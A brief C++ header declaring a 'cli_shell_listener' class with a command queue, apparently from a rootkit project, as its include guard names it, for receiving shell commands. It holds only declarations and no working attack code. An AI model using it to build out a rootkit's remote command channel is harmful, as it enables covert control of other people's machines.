//
// Created by idan on 12/31/23.
//

#ifndef ROOTKIT_CLI_SHELL_LISTENER_H
#define ROOTKIT_CLI_SHELL_LISTENER_H

#include <queue>
#include "../../../basic/network/basic_listener.h"

class cli_shell_listener : public basic_listener {
protected:
    std::queue<std::string> commands_queue;

public:
    void listen() override;

    std::string pop_next_command();

};


#endif //ROOTKIT_CLI_SHELL_LISTENER_H
